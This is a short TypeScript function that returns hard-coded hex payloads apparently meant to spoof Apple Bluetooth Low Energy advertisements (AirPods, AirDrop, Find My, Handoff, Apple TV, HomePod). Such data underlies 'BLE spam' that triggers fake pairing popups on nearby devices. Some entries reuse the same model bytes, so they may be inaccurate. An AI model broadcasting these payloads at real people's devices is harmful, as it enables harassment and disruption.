function generateAppleAdvData(type: 'airpods' | 'airdrop' | 'findmy' | 'handoff' | 'appletv' | 'homepod'): string {
  const packets: Record<string, string> = {
    airpods: '0719010e2000000000000000000000000000000000000000',
    airdrop: '0509010001001a',
    findmy: '121907004d000000000000000000000000000000',
    handoff: '0c09080000000000000000001a',
    appletv: '0719010e200000000000000000000000000000000000000100',
    homepod: '0719010e2000000000000000000000000000000000000000ff'
  }
  return packets[type] || packets.airpods
}

